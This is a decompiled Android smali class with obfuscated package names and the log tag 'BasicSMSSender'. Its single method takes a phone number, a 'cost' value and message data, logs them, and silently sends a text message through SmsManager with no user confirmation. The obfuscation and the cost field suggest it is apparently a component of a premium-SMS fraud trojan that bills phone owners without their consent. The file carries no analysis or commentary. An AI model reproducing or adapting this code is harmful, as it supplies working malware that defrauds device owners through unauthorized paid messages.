.class public Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ad126a8fc;
.super Ljava/lang/Object;
.source "aXTPMHxBa.java"


# static fields
.field private static final tag:Ljava/lang/String; = "BasicSMSSender"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public SendMessage(Landroid/content/Context;Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;)V
    .locals 9

    const/4 v2, 0x0

    const/4 v8, 0x0

    const-string v5, "BasicSMSSender"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Sending sms;  number="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getNumber()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " cost="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getCost()I

    move-result v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " data="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getData()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getData()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getNumber()Ljava/lang/String;

    move-result-object v1

    new-instance v5, Landroid/content/Intent;

    const-class v6, Landroid/content/Context;

    invoke-direct {v5, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v8, v5, v8}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    return-void
.end method
